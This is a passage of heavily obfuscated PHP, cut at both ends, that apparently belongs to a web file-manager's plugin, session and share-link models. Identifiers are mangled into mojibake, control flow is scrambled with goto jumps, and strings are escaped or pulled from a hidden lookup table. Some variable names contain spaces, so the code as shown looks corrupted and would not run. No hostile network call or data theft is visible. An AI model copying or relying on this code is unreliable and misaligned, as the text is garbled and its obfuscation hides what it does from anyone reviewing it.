$d¸æîÙœÃ; } public function getPackageJson($Eåˆ“ØãŒ) { return Hook::apply($Eåˆ“ØãŒ . $_SERVER[æ§›¦ÌáØ][1809]); } public function getConfig($Dã£Ë»ù¡ß, $E‘Ë¯Üå’– = false) { $dÜ†‘ô¾Åå =& $_SERVER[æ§›¦ÌáØ]; $bòõì´öå® = array(); $bÅÕ¼¾î¿„ = $this->loadList($Dã£Ë»ù¡ß); if ($bÅÕ¼¾î¿„ && is_array($bÅÕ¼¾î¿„[$dÜ†‘ô¾Åå[6]])) { $bòõì´öå® = $bÅÕ¼¾î¿„[$dÜ†‘ô¾Åå[6]]; } if (!$bòõì´öå® || $E‘Ë¯Üå’–) { $bòõì´öå® = $this->getConfigDefault($Dã£Ë»ù¡ß); } return $bòõì´öå®; } public function setConfig($Då§Ã¼Î…, $dä•¿‘’ôÕ = false) { goto eàï²ğÑ‘œ; dŞ‹ÍÚ³–‹: $Fó±‘¤–Œ = $aÛÔßôñÙ‘[$Dˆ‘ºÇ”­ì[6]]; if ($dä•¿‘’ôÕ == !1) { $Fó±‘¤–Œ = array(); $dä•¿‘’ôÕ = $this->getConfigDefault($Då§Ã¼Î…); } foreach ($dä•¿‘’ôÕ as $a÷·®‹ø² => $b²¿Å¼ç®) { $Fó±‘¤–Œ[$a÷·®‹ø²] = is_string($b²¿Å¼ç®) ? trim($b²¿Å¼ç®) : $b²¿Å¼ç®; } goto fŠÔäÚ©Á; eàï²ğÑ‘œ: $Dˆ‘ºÇ”­ì =& $_SERVER[æ§›¦ÌáØ]; $aÛÔßôñÙ‘ = $this->loadList($Då§Ã¼Î…); if (!$aÛÔßôñÙ‘) { return !1; } goto dŞ‹ÍÚ³–‹; fŠÔäÚ©Á: $this->update($aÛÔßôñÙ‘[$Dˆ‘ºÇ”­ì[393]], array($Dˆ‘ºÇ”­ì[6] => $Fó±‘¤–Œ)); goto dˆ•Í§­õí; dˆ•Í§­õí: } public function viewList() { goto fä¦£ôÓÔ; b®‰Ò¥Ù©á: return $b“ò›¡¬†½; goto eÙñÄ»‡äñ; fä¦£ôÓÔ: $AÜÅÊœ®¤Ø =& $_SERVER[æ§›¦ÌáØ]; $dßƒê¥Õ¿ì = $this->loadList(); $this->pluginScan($dßƒê¥Õ¿ì); goto bà²ÌÑ¿Áø; bà²ÌÑ¿Áø: $dßƒê¥Õ¿ì = $this->loadPluginList(); $b“ò›¡¬†½ = array(); foreach ($dßƒê¥Õ¿ì as $BğµØñ æº => $aÆµä»¾…¥) { unset($aÆµä»¾…¥[$AÜÅÊœ®¤Ø[1801]], $aÆµä»¾…¥[$AÜÅÊœ®¤Ø[6]]); $a„•©á¼¼ = PLUGIN_DIR . $aÆµä»¾…¥[$AÜÅÊœ®¤Ø[28]] . $AÜÅÊœ®¤Ø[1803]; if (!is_file($a„•©á¼¼)) { continue; } $C•¤¨´¶ë« = Hook::apply($aÆµä»¾…¥[$AÜÅÊœ®¤Ø[28]] . $AÜÅÊœ®¤Ø[1809]); if (is_array($C•¤¨´¶ë«)) { $b“ò›¡¬†½[$BğµØñ æº] = array_merge($aÆµä»¾…¥, $C•¤¨´¶ë«); } } goto b®‰Ò¥Ù©á; eÙñÄ»‡äñ: } private function loadPluginList() { $fåÕªºèÅâ =& $_SERVER[æ§›¦ÌáØ]; $eËÃĞ©Áê… = $this->loadList(); if (strtolower(MOD) == $fåÕªºèÅâ[1810]) { return $eËÃĞ©Áê…; } $a±á†‡ŒÃë = Hook::trigger($fåÕªºèÅâ[1811], $eËÃĞ©Áê…); if ($eËÃĞ©Áê… && !$a±á†‡ŒÃë) { die; } return $a±á†‡ŒÃë ? $a±á†‡ŒÃë : $eËÃĞ©Áê…; } private function pluginScan($C¾ç—¸Ø) { $Cöé½Ş½ùê =& $_SERVER[æ§›¦ÌáØ]; recursion_dir(PLUGIN_DIR, $eØŒåŠÂò, $fÃëÆ¡ÓÛ¡, 0); foreach ($eØŒåŠÂò as $E‚‹ÌĞËÄÄ) { $dÕÅ©™ƒÈÛ = get_path_this($E‚‹ÌĞËÄÄ); if (isset($C¾ç—¸Ø[$dÕÅ©™ƒÈÛ]) || !file_exists($E‚‹ÌĞËÄÄ . $Cöé½Ş½ùê[1812]) || !file_exists($E‚‹ÌĞËÄÄ . $Cöé½Ş½ùê[1803])) { continue; } Hook::apply($dÕÅ©™ƒÈÛ . $Cöé½Ş½ùê[1806]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\x73\145\x73\163\151\x6f\x6e"; public function get($aøß›ë“ˆõ) { $D¬ª›£åóá =& $_SERVER[æ§›¦ÌáØ]; $BÄÀ©œÍÑ­ = $this->where(array($D¬ª›£åóá[1813] => $aøß›ë“ˆõ))->find(); if (!is_array($BÄÀ©œÍÑ­)) { return !1; } return $BÄÀ©œÍÑ­[$D¬ª›£åóá[708]]; } public function set($F¬‡Î²¦¾, $c§í¸ÚÊä, $FÓºŒ¾¹ÏÓ = 3600) { $a­Î‘òØĞ =& $_SERVER[æ§›¦ÌáØ]; $B§°¯¶Åˆ = array($a­Î‘òØĞ[1813] => $F¬‡Î²¦¾, $a­Î‘òØĞ[1722] => $c§í¸ÚÊä, $a­Î‘òØĞ[1814] => $FÓºŒ¾¹ÏÓ + time()); if (Session::get($a­Î‘òØĞ[1815])) { $B§°¯¶Åˆ[$a­Î‘òØĞ[1520]] = Session::get($a­Î‘òØĞ[1815]); } else { $B§°¯¶Åˆ[$a­Î‘òØĞ[1520]] = 0; } if ($this->get($F¬‡Î²¦¾)) { return $this->where(array($a­Î‘òØĞ[1813] => $F¬‡Î²¦¾))->save($B§°¯¶Åˆ); } else { return $this->add($B§°¯¶Åˆ, array(), !0); } } public function remove($Eáˆ›Â»…) { return $this->where(array($_SERVER[æ§›¦ÌáØ][1813] => $Eáˆ›Â»…))->delete(); } public function clearTimeout() { return $this->where($_SERVER[æ§›¦ÌáØ][1816] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\124\x69\155\145", "\x74\x69\155\x65", "\x69\156\x73\145\x72\x74\x2c\165\160\x64\141\x74\145", "\x66\165\156\143\x74\x69\157\156"), array("\x63\162\145\x61\x74\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\x73\145\162\x74", "\146\165\x6e\143\164\151\x6f\156"), array("\x6f\x70\164\151\157\x6e\163", '', "\x69\x6e\163\145\x72\164\54\x75\x70\144\x61\164\x65\x2c\163\145\x6c\145\x63\x74", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($E·ÄÔÑäœ„) { $b³Ëõ»éº =& $_SERVER[æ§›¦ÌáØ]; $dó‡§…ï•… = isset($E·ÄÔÑäœ„[0]) ? $E·ÄÔÑäœ„[0] : !1; return array($b³Ëõ»éº[1817] => array(USER_ID, $b³Ëõ»éº[1818]), $b³Ëõ»éº[1761] => array($dó‡§…ï•…, $b³Ëõ»éº[1819])); } protected function listSimple() { $b‹ù¬ÌÁ¢¦ = array($_SERVER[æ§›¦ÌáØ][1520] => USER_ID); $b³„² ö÷ = $this->field($this->fieldList)->where($b‹ù¬ÌÁ¢¦)->select(); return $b³„² ö÷ ? $b³„² ö÷ : array(); } protected function getInfo($cïª¼§¹Ï†, $bª´—ï¹È = false) { $c²‚¨¶ìˆŠ =& $_SERVER[æ§›¦ÌáØ]; if ($bª´—ï¹È) { return $this->_getShareInfo(array($c²‚¨¶ìˆŠ[468] => $cïª¼§¹Ï†)); } $dØ×«ÇïÉÖ = $this->cacheFunctionGet($c²‚¨¶ìˆŠ[1768], $cïª¼§¹Ï†); return $dØ×«ÇïÉÖ; } public function getInfoByHash($EÖ©¬÷­öí) { return $this->_getShareInfo(array($_SERVER[æ§›¦ÌáØ][470] => $EÖ©¬÷­öí)); } public function getInfoByPath($fÃàÌŸªØ) { $c¼˜ÁØÍ¢³ =& $_SERVER[æ§›¦ÌáØ]; $EØ‰ŞÍ†… = array($c¼˜ÁØÍ¢³[1520] => USER_ID, $c¼˜ÁØÍ¢³[395] => $fÃàÌŸªØ); return $this->_getShareInfo($EØ‰ŞÍ†…); } public function getInfoBySourcePath($f‚Ïõåó¿Š) { $c‰ÓòâÚ =& $_SERVER[æ§›¦ÌáØ]; $c¸ˆò¯õ³… = array($c‰ÓòâÚ[1520] => USER_ID, $c‰ÓòâÚ[1061] => $f‚Ïõåó¿Š); return $this->_getShareInfo($c¸ˆò¯õ³…); } private function _getShareInfo($AØØ‰šÏ) { goto a‹¹¢¬†îÓ; DÒèš™Ÿ: if ($e£„Ä Šª‘[$Fãè×ØÎ°•[395]] == $Fãè×ØÎ°•[191]) { $e£„Ä Šª‘[$Fãè×ØÎ°•[85]] = IO::info($e£„Ä Šª‘[$Fãè×ØÎ°•[1061]]); } else { $e£„Ä Šª‘[$Fãè×ØÎ°•[85]] = Model($Fãè×ØÎ°•[1196])->pathInfo($e£„Ä Šª‘[$Fãè×ØÎ°•[395]]); } $e£„Ä Šª‘[$Fãè×ØÎ°•[1821]] = $eöïš˜É•¿; return $e£„Ä Šª‘; goto d½êªš¨Í; a‹¹¢¬†îÓ: $Fãè×ØÎ°• =& $_SERVER[æ§›¦ÌáØ]; $e£„Ä Šª‘ = $this->where($AØØ‰šÏ)->find(); if (!$e£„Ä Šª‘) { return !1; } goto F¡´Û…‰ô; F¡´Û…‰ô: $AØØ‰šÏ = array($Fãè×ØÎ°•[468] => $e£„Ä Šª‘[$Fãè×ØÎ°•[468]]); $b©Ñ †”’´ = $Fãè×ØÎ°•[1820]; $eöïš˜É•¿ = Model($Fãè×ØÎ°•[577])->order($Fãè×ØÎ°•[393])->field($b©Ñ †”’´)->where($AØØ‰šÏ)->select(); goto DÒèš™Ÿ; d½êªš¨Í: } protected function getInfoAuth($B¸¸„çÎš) { $cÔëÅÉŠæ— =& $_SERVER[æ§›¦ÌáØ]; $Då¹ÁËëÀ  = $this->getInfo($B¸¸„çÎš); $Då¹ÁËëÀ [$cÔëÅÉŠæ—[406]] = Model($cÔëÅÉŠæ—[482])->authMake($Då¹ÁËëÀ [$cÔëÅÉŠæ—[1821]]); return $Då¹ÁËëÀ ; } protected function listData($dñˆ¼ø¿ï = null, $Aß–¨Œ×…œ = 300) { $eÉ¼Š‹ƒÃ =& $_SERVER[æ§›¦ÌáØ]; $c‡É¢ğ§˜ = array(array($eÉ¼Š‹ƒÃ[473] => array($eÉ¼Š‹ƒÃ[960], 0), $eÉ¼Š‹ƒÃ[475] => array($eÉ¼Š‹ƒÃ[960], 0), $eÉ¼Š‹ƒÃ[1822] => $eÉ¼Š‹ƒÃ[1776])); if ($dñˆ¼ø¿ï == $eÉ¼Š‹ƒÃ[1823]) { $c‡É¢ğ§˜ = array($eÉ¼Š‹ƒÃ[473] => 1); } else { if ($dñˆ¼ø¿ï == $eÉ¼Š‹ƒÃ[1046]) { $c‡É¢ğ§˜ = array($eÉ¼Š‹ƒÃ[475] => 1); } } $c‡É¢ğ§˜[$eÉ¼Š‹ƒÃ[1520]] = USER_ID; $e¤×öèåµ = $this->where($c‡É¢ğ§˜)->selectPage($Aß–¨Œ×…œ); return $e¤×öèåµ; } protected function listToMe($eéêìÛ¬ = 300) { goto dÛ×ô´«ôÉ; fŞÓß¦°: if (!$F«ñ „•Â•) { return $fÔ®ˆó‚Ç; } $CÚ¬…Öà†Ù = $c£¦åĞö£[1825]; $eÆµâÔÉßì = array($c£¦åĞö£[468] => array($c£¦åĞö£[411], array_keys($F«ñ „•Â•)), $c£¦åĞö£[1520] => array($c£¦åĞö£[962], $c£¦åĞö£[191])); goto C¼¾£ÛÊ‡Ã; e²ÄÒØÒ®ø: $A—À£²è² = array($c£¦åĞö£[1826] => $f‰ÈîŠ¡Ñ, $c£¦åĞö£[1827] => $fÔ®ˆó‚Ç[$c£¦åĞö£[364]]); return $A—À£²è²; goto a—ßÑÕìƒ; dÛ×ô´«ôÉ: $c£¦åĞö£ =& $_SERVER[æ§›¦ÌáØ]; $eÌ”‡¿ÖÃ½ = Model($c£¦åĞö£[1824])->userGroupParents(USER_ID); $eÆµâÔÉßì = array($c£¦åĞö£[562] => SourceModel::TYPE_USER, $c£¦åĞö£[484] => USER_ID); goto DÂ«…–¿ŠË; C¼¾£ÛÊ‡Ã: $f‰ÈîŠ¡Ñ = $this->field($CÚ¬…Öà†Ù)->where($eÆµâÔÉßì)->select(); foreach ($f‰ÈîŠ¡Ñ as $fñ…¢î¹­‘ => &$B˜ •ôÜùõ) { $B˜ •ôÜùõ[$c£¦åĞö£[1821]] = $F«ñ „•Â•[$B˜ •ôÜùõ[$c£¦åĞö£[468]]]; } unset($B˜ •ôÜùõ); goto e²ÄÒØÒ®ø; DÂ«…–¿ŠË: if ($eÌ”‡¿ÖÃ½) { $eÆµâÔÉßì = array(array($c£¦åĞö£[562] => SourceModel::TYPE_USER, $c£¦åĞö£[484] => USER_ID), array($c£¦åĞö£[562] => SourceModel::TYPE_GROUP, $c£¦åĞö£[484] => array($c£¦åĞö£[7], $eÌ”‡¿ÖÃ½)), $c£¦åĞö£[1822] => $c£¦åĞö£[1776]); } $fÔ®ˆó‚Ç = Model($c£¦åĞö£[577])->where($eÆµâÔÉßì)->selectPage($eéêìÛ¬); $F«ñ „•Â• = array_to_keyvalue_group($fÔ®ˆó‚Ç[$c£¦åĞö£[367]], $c£¦åĞö£[468]); goto fŞÓß¦°; a—ßÑÕìƒ: } protected function shareAdd($E–—ŒŸ¿›Ä, $BÕÌ´­ƒ–·) { $eäÑîÄ±Ä =& $_SERVER[æ§›¦ÌáØ]; $E±¢ùĞÌÎÃ = $this->_addShareData($E–—ŒŸ¿›Ä, $BÕÌ´­ƒ–·); if (!empty($BÕÌ´­ƒ–·[$eäÑîÄ±Ä[1828]])) { $this->_shareAuthSet($E±¢ùĞÌÎÃ, $BÕÌ´­ƒ–·[$eäÑîÄ±Ä[1828]]); } $this->shareEventAdd($E–—ŒŸ¿›Ä, $BÕÌ´­ƒ–·, $eäÑîÄ±Ä[1049]); return $E±¢ùĞÌÎÃ; } protected function shareAddSystem($f×…ÜóÄÈ˜, $A¯İ¶÷°Öò) { $E‚Ùôó½ŞÆ =& $_SERVER[æ§›¦ÌáØ]; $fĞ—±Â¿Å = $this->_addShareData($f×…ÜóÄÈ˜, $A¯İ¶÷°Öò, $E‚Ùôó½ŞÆ[1161]); $this->_shareAuthSet($fĞ—±Â¿Å, $A¯İ¶÷°Öò[$E‚Ùôó½ŞÆ[1828]]); return $fĞ—±Â¿Å; } private function shareEventAdd($eèÕ«”Şìè, $a‹…ÓÓß, $F¾Ó… ±á = "\141\x64\144") { goto FÕ™’Û‡º×; FÕ™’Û‡º×: $C”×ñÙî¿ë =& $_SERVER[æ§›¦ÌáØ]; if (!$eèÕ«”Şìè || $eèÕ«”Şìè == $C”×ñÙî¿ë[191]) { return; } if ($F¾Ó… ±á == $C”×ñÙî¿ë[1049]) { if ($a‹…ÓÓß[$C”×ñÙî¿ë[473]] == $C”×ñÙî¿ë[87]) { Model($C”×ñÙî¿ë[546])->eventShare($eèÕ«”Şìè, $C”×ñÙî¿ë[1829]); } if ($a‹…ÓÓß[$C”×ñÙî¿ë[475]] == $C”×ñÙî¿ë[87]) { Model($C”×ñÙî¿ë[546])->eventShare($eèÕ«”Şìè, $C”×ñÙî¿ë[1830]); } return; } goto dÜîòÕ„»; b„…ÈõƒÜ: Model($C”×ñÙî¿ë[546])->eventShare($eèÕ«”Şìè, $eÎ’œÁ—Ù‰); return; goto B‚›ÙÊèÉ‡; dÜîòÕ„»: $B¶àÛ…ƒ‡ = $this->getInfoByPath($eèÕ«”Şìè); $eÎ’œÁ—Ù‰ = $C”×ñÙî¿ë[1831]; if ($B¶àÛ…ƒ‡[$C”×ñÙî¿ë[473]] == $C”×ñÙî¿ë[191] && $a‹…ÓÓß[$C”×ñÙî¿ë[473]] == $C”×ñÙî¿ë[87]) { $eÎ’œÁ—Ù‰ = $C”×ñÙî¿ë[1829]; } goto fº£‡ÖÎ–ò; fº£‡ÖÎ–ò: if ($B¶àÛ…ƒ‡[$C”×ñÙî¿ë[473]] == $C”×ñÙî¿ë[87] && $a‹…ÓÓß[$C”×ñÙî¿ë[473]] == $C”×ñÙî¿ë[191]) { $eÎ’œÁ—Ù‰ = $C”×ñÙî¿ë[1832]; } if ($B¶àÛ…ƒ‡[$C”×ñÙî¿ë[475]] == $C”×ñÙî¿ë[191] && $a‹…ÓÓß[$C”×ñÙî¿ë[475]] == $C”×ñÙî¿ë[87]) { $eÎ’œÁ—Ù‰ = $C”×ñÙî¿ë[1830]; } if ($B¶àÛ…ƒ‡[$C”×ñÙî¿ë[475]] == $C”×ñÙî¿ë[87] && $a‹…ÓÓß[$C”×ñÙî¿ë[475]] == $C”×ñÙî¿ë[191]) { $eÎ’œÁ—Ù‰ = $C”×ñÙî¿ë[1833]; } goto b„…ÈõƒÜ; B‚›ÙÊèÉ‡: } private function _addShareData($d…×œ…˜², $bôß¾¹ÖŞ¿ = array(), $fïóâÖé¿ = false) { goto d†–­§©·“; bø©¶Ë¢œã: if ($d…×œ…˜² == 0) { $b‹º¹Ïô†Û = array($a„òÙ½¾†ù[1834] => $bôß¾¹ÖŞ¿[$a„òÙ½¾†ù[1061]], $a„òÙ½¾†ù[1511] => $fŠèíÉâÛ”); } if ($dŞˆ§áÁÃ = $this->where($b‹º¹Ïô†Û)->find()) { return $dŞˆ§áÁÃ[$a„òÙ½¾†ù[468]]; } if ($d…×œ…˜² == 0) { $BƒÖËÅª½‚ = array($a„òÙ½¾†ù[28] => get_path_this($bôß¾¹ÖŞ¿[$a„òÙ½¾†ù[76]])); } else { $BƒÖËÅª½‚ = Model($a„òÙ½¾†ù[783])->sourceInfo($d…×œ…˜²); if (!$BƒÖËÅª½‚) { return !1; } } goto B„îŠì¬´Ç; d†–­§©·“: $a„òÙ½¾†ù =& $_SERVER[æ§›¦ÌáØ]; $fŠèíÉâÛ” = $fïóâÖé¿ == $a„òÙ½¾†ù[1161] ? 0 : USER_ID; $b‹º¹Ïô†Û = array($a„òÙ½¾†ù[410] => $d…×œ…˜², $a„òÙ½¾†ù[1511] => $fŠèíÉâÛ”); goto bø©¶Ë¢œã; a£Ø“Û: $this->where(array($a„òÙ½¾†ù[467] => $DÖøõÆ–ˆÖ))->save($D¡’¿õ…ò); return $DÖøõÆ–ˆÖ; goto fó¢«„¯„Æ; B„îŠì¬´Ç: if (!$bôß¾¹ÖŞ¿[$a„òÙ½¾†ù[1423]]) { $bôß¾¹ÖŞ¿[$a„òÙ½¾†ù[1423]] = $BƒÖËÅª½‚[$a„òÙ½¾†ù[28]]; } $BÆĞ½§°“Ô = array($a„òÙ½¾†ù[1511] => $fŠèíÉâÛ”, $a„òÙ½¾†ù[410] => $d…×œ…˜², $a„òÙ½¾†ù[1423] => $a„òÙ½¾†ù[33], $a„òÙ½¾†ù[473] => 0, $a„òÙ½¾†ù[475] => 0, $a„òÙ½¾†ù[1061] => $a„òÙ½¾†ù[33], $a„òÙ½¾†ù[305] => $a„òÙ½¾†ù[33], $a„òÙ½¾†ù[840] => $a„òÙ½¾†ù[33], $a„òÙ½¾†ù[1835] => 0, $a„òÙ½¾†ù[1836] => 0, $a„òÙ½¾†ù[476] => 0, $a„òÙ½¾†ù[477] => $a„òÙ½¾†ù[33], $a„òÙ½¾†ù[470] => $a„òÙ½¾†ù[33]); $B¢œŠ®™Ò£ = explode($a„òÙ½¾†ù[47], $a„òÙ½¾†ù[1837]); goto f¥™ç›ÜÀÄ; f¥™ç›ÜÀÄ: foreach ($B¢œŠ®™Ò£ as $b¥¼Ÿèç¦´) { if (!isset($bôß¾¹ÖŞ¿[$b¥¼Ÿèç¦´])) { continue; } $BÆĞ½§°“Ô[$b¥¼Ÿèç¦´] = $bôß¾¹ÖŞ¿[$b¥¼Ÿèç¦´]; } $DÖøõÆ–ˆÖ = $this->add($BÆĞ½§°“Ô); $D¡’¿õ…ò = array($a„òÙ½¾†ù[470] => short_id($DÖøõÆ–ˆÖ)); goto a£Ø“Û; fó¢«„¯„Æ: } private function _shareAuthSet($F¯­°·’…, $aÜ«À‚¬°) { goto dø‰…Õôàæ; EŠÅ¤òèÛË: $D»é•…­Ú->where(array($e¶ÉòÓ¼…[468] => $F¯­°·’…))->delete(); $AòŠ«é´¶¡ = array(); foreach ($aÜ«À‚¬° as $C ¨‡½™­) { $F”îŒ±° = SourceModel::TYPE_USER; if ($C ¨‡½™­[$e¶ÉòÓ¼…[404]] == SourceModel::TYPE_GROUP) { $F”îŒ±° = SourceModel::TYPE_GROUP; } $F˜Á»–§Ø¡ = array($e¶ÉòÓ¼…[468] => $F¯­°·’…, $e¶ÉòÓ¼…[404] => $F”îŒ±°, $e¶ÉòÓ¼…[484] => intval($C ¨‡½™­[$e¶ÉòÓ¼…[484]]), $e¶ÉòÓ¼…[1784] => 0, $e¶ÉòÓ¼…[1838] => -1); if ($C ¨‡½™­[$e¶ÉòÓ¼…[1784]]) { $F˜Á»–§Ø¡[$e¶ÉòÓ¼…[1784]] = $C ¨‡½™­[$e¶ÉòÓ¼…[1784]]; } else { if ($C ¨‡½™­[$e¶ÉòÓ¼…[1838]]) { $F˜Á»–§Ø¡[$e¶ÉòÓ¼…[1838]] = $C ¨‡½™­[$e¶ÉòÓ¼…[1838]]; } } $AòŠ«é´¶¡[] = $F˜Á»–§Ø¡; } goto Fİ¢ƒ’‹·ğ; Fİ¢ƒ’‹·ğ: return $D»é•…­Ú->addAll($AòŠ«é´¶¡, array(), !0); goto c„·¿“öŠÉ; dø‰…Õôàæ: $e¶ÉòÓ¼… =& $_SERVER[æ§›¦ÌáØ]; if (!is_array($aÜ«À‚¬°)) { return !1; } $D»é•…­Ú = Model($e¶ÉòÓ¼…[1788]); goto EŠÅ¤òèÛË; c„·¿“öŠÉ: } public function numViewAdd($a¡ñæÜ¾Å±) { $cÍ°‚ƒßøĞ =& $_SERVER[æ§›¦ÌáØ]; $dÜ…ö¬­Û = array($cÍ°‚ƒßøĞ[467] => $a¡ñæÜ¾Å±); $this->where($dÜ…ö¬­Û)->setAdd($cÍ°‚ƒßøĞ[1835]); } public function numDownloadAdd($BÏå…ÌÜÍŸ) { $FÜõÉ°™ç =& $_SERVER[æ§›¦ÌáØ]; $e¨”™ĞÑçß = array($FÜõÉ°™ç[467] => $BÏå…ÌÜÍŸ); $this->where($e¨”™ĞÑçß)->setAdd($FÜõÉ°™ç[1836]); } protected function shareEdit($e×—“¼Ø¹, $fòÉË—ÏÌõ) { goto eöÑØ°‘Œ; D…”á¶ñÊ: foreach ($Fè¼£…Ô as $AÊ¥ß§¼›) { if (!array_key_exists($AÊ¥ß§¼›, $fòÉË—ÏÌõ)) { continue; } $F÷ƒ‰Éë¬[$AÊ¥ß§¼›] = $fòÉË—ÏÌõ[$AÊ¥ß§¼›]; } $this->shareEventAdd($eµÕƒ·îœ[$DŸ·ˆÑ‰Æé[395]], $fòÉË—ÏÌõ, $DŸ·ˆÑ‰Æé[1656]); $this->where(array($DŸ·ˆÑ‰Æé[467] => $e×—“¼Ø¹))->save($F÷ƒ‰Éë¬); goto c¿È¼»Ïö½; eöÑØ°‘Œ: $DŸ·ˆÑ‰Æé =& $_SERVER[æ§›¦ÌáØ]; $eµÕƒ·îœ = $this->getInfo($e×—“¼Ø¹); if (!$eµÕƒ·îœ) { return !1; } goto Aéñ‘Ò½¼; Aéñ‘Ò½¼: $this->_checkLinkShare($fòÉË—ÏÌõ, $eµÕƒ·îœ); $F÷ƒ‰Éë¬ = array(); $Fè¼£…Ô = explode($DŸ·ˆÑ‰Æé[47], $DŸ·ˆÑ‰Æé[1839]); goto D…”á¶ñÊ; c¿È¼»Ïö½: if (isset($fòÉË—ÏÌõ[$DŸ·ˆÑ‰Æé[1828]])) { $this->_shareAuthSet($e×—“¼Ø¹, $fòÉË—ÏÌõ[$DŸ·ˆÑ‰Æé[1828]]); } return !0; goto c¸Œß†ƒÖï; c¸Œß†ƒÖï: } private function _checkLinkShare($FÔ’™ÆÄÆ, $Fİ­Ê¹ÅÍÅ) { goto DÖßÇè±ÙŞ; DÖßÇè±ÙŞ: $EĞŠ¤ôñ‰ =& $_SERVER[æ§›¦ÌáØ]; if ($FÔ’™ÆÄÆ[$EĞŠ¤ôñ‰[473]] != $EĞŠ¤ôñ‰[87]) { return; } $CåÙ‡ŞÖ’İ = $Fİ­Ê¹ÅÍÅ[$EĞŠ¤ôñ‰[85]][$EĞŠ¤ôñ‰[395]]; goto eÅ®¾¨×î“; eÅ®¾¨×î“: if ($Fİ­Ê¹ÅÍÅ[$EĞŠ¤ôñ‰[85]][$EĞŠ¤ôñ‰[29]] != $EĞŠ¤ôñ‰[193]) { $d¬•„²—êî = $this->_folderReport($CåÙ‡ŞÖ’İ); if (!$d¬•„²—êî) { return; } show_json(LNG($EĞŠ¤ôñ‰[1840]) . $EĞŠ¤ôñ‰[1841] . $d¬•„²—êî, !1); } $F›¨‰ˆ•¾ = Model($EĞŠ¤ôñ‰[783])->fileInfoGet($Fİ­Ê¹ÅÍÅ[$EĞŠ¤ôñ‰[85]][$EĞŠ¤ôñ‰[395]]); if (!$F›¨‰ˆ•¾) { return; } goto D¼áä…í¹; D¼áä…í¹: $aÈ²êªÄ¦Ø = $this->shareFileMeta($F›¨‰ˆ•¾[$EĞŠ¤ôñ‰[447]]); if (isset($aÈ²êªÄ¦Ø[$EĞŠ¤ôñ‰[372]]) && $aÈ²êªÄ¦Ø[$EĞŠ¤ôñ‰[372]] == $EĞŠ¤ôñ‰[87]) { show_json(LNG($EĞŠ¤ôñ‰[1842]), !1); } goto Eí¤÷ñ¤Ò; Eí¤÷ñ¤Ò: } private function _folderReport($F˜¬Çì±±”) { goto aô–ÇØÊİ™; c²Ö©—ë·ò: $Aš­ª×½‘ = array_to_keyvalue($AÎßÁ±İè, $aŠ¶Ï»Ó[33], $aŠ¶Ï»Ó[28]); $Aš­ª×½‘[] = $c¾¼ª¾°ªİ[$aŠ¶Ï»Ó[28]]; return implode($aŠ¶Ï»Ó[8], $Aš­ª×½‘); goto dÚ¤ Ê¬¹›; fÂ¶œš³–í: if (!$EâĞé÷Èäè) { return !1; } $EâĞé÷Èäè = array_to_keyvalue($EâĞé÷Èäè, $aŠ¶Ï»Ó[33], $aŠ¶Ï»Ó[447]); $AóŞ³áªî = $aŠ¶Ï»Ó[47] . $F˜¬Çì±±” . $aŠ¶Ï»Ó[47]; goto b†ö³«Âõ; b†ö³«Âõ: $eÑ¢ç÷££¶ = array($aŠ¶Ï»Ó[447] => array($aŠ¶Ï»Ó[7], $EâĞé÷Èäè), $aŠ¶Ï»Ó[502] => array($aŠ¶Ï»Ó[380], "\45{$AóŞ³áªî}\x25"), $aŠ¶Ï»Ó[423] => 0); $c¾¼ª¾°ªİ = Model($aŠ¶Ï»Ó[783])->where($eÑ¢ç÷££¶)->field($aŠ¶Ï»Ó[1844])->find(); if (!$c¾¼ª¾°ªİ) { return !1; } goto ašÁ®·ÃÒ¬; aô–ÇØÊİ™: $aŠ¶Ï»Ó =& $_SERVER[æ§›¦ÌáØ]; $eÑ¢ç÷££¶ = array($aŠ¶Ï»Ó[447] => array($aŠ¶Ï»Ó[960], 0), $aŠ¶Ï»Ó[703] => 3); $EâĞé÷Èäè = Model($aŠ¶Ï»Ó[1843])->where($eÑ¢ç÷££¶)->field($aŠ¶Ï»Ó[447])->select(); goto fÂ¶œš³–í; ašÁ®·ÃÒ¬: $e”ê¨‹·£ˆ = substr($c¾¼ª¾°ªİ[$aŠ¶Ï»Ó[502]], strpos($c¾¼ª¾°ªİ[$aŠ¶Ï»Ó[502]], $AóŞ³áªî)); $eÑ¢ç÷££¶ = array($aŠ¶Ï»Ó[395] => array($aŠ¶Ï»Ó[7], trim($e”ê¨‹·£ˆ, $aŠ¶Ï»Ó[47]))); $AÎßÁ±İè = Model($aŠ¶Ï»Ó[783])->where($eÑ¢ç÷££¶)->field($aŠ¶Ï»Ó[28])->select(); goto c²Ö©—ë·ò; dÚ¤ Ê¬¹›: } protected function remove($c«ğ˜Î«Ì) { goto aÌÄÅáÏÕ“; Féì‹ñğœ†: for ($a¾’ô¦œÉ = 0; $a¾’ô¦œÉ < count($F›ó¸ÃËÓÔ); $a¾’ô¦œÉ++) { $fÚâ¤Û‰œ¬ = $this->getInfo($F›ó¸ÃËÓÔ[$a¾’ô¦œÉ]); if ($fÚâ¤Û‰œ¬[$dÖÏ°Ú½‡[475]] == $dÖÏ°Ú½‡[87]) { Model($dÖÏ°Ú½‡[546])->eventShare($fÚâ¤Û‰œ¬[$dÖÏ°Ú½‡[395]], $dÖÏ°Ú½‡[1833]); } if ($fÚâ¤Û‰œ¬[$dÖÏ°Ú½‡[473]] == $dÖÏ°Ú½‡[87]) { Model($dÖÏ°Ú½‡[546])->eventShare($fÚâ¤Û‰œ¬[$dÖÏ°Ú½‡[395]], $dÖÏ°Ú½‡[1832]); } } return $Fêª²ÂÇ¤Ú; goto bÉìÑ·Ã§¢; a–¿Î˜àŠÌ: $Fêª²ÂÇ¤Ú = $this->where($FÇËÂø¶œÎ)->delete(); if ($Fêª²ÂÇ¤Ú) { Model($dÖÏ°Ú½‡[577])->where(array($dÖÏ°Ú½‡[468] => $c«ğ˜Î«Ì))->delete(); } $F›ó¸ÃËÓÔ = is_array($c«ğ˜Î«Ì) ? $c«ğ˜Î«Ì[1] : array($c«ğ˜Î«Ì); goto Féì‹ñğœ†; aÌÄÅáÏÕ“: $dÖÏ°Ú½‡ =& $_SERVER[æ§›¦ÌáØ]; if (is_array($c«ğ˜Î«Ì)) { $c«ğ˜Î«Ì = array($dÖÏ°Ú½‡[7], 